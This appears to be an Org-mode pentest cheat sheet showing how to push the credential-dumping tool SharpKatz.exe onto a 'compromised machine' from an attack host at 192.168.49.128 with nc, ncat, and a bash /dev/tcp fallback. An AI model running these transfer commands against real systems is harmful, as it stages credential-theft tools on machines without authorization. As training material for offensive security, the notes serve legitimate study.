* Netcat
+ r/w using =TCP/UDP=

* FT c ~nc~ && ~ncat~
+ start ~nc~ on compromised machine (listen c ~-l~, port ~-p 8000~)
** netcat
#+begin_src bash
    victim@target:~$ nc -l -p 8000 > SharpKatz.exe
#+end_src
- ~-q 0~ closes connection once file transfer is complete (=nc=)
*** Attack host
~nc -q 0 192.168.49.128 8000 < SharpKatz.exe~
*** send file as input
~sudo nc -l -p 443 -q 0 < SharpKatz.exe~
** ncat
#+begin_src bash
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
#+end_src
- ~--recv-only~ closes connection once file transfer is complete (=ncat=)
*** Attack host
~ncat --send-only 192.168.49.128 8000 < SharpKatz.exe~
*** send file as input
~nc 192.168.49.128 443 > SharpKatz.exe~
** Compromised machine
#+begin_src bash
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
#+end_src
#+begin_src bash
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
#+end_src

** if no nc/ncat
- bash supports r/w on =/dev/TCP/=
~cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe~
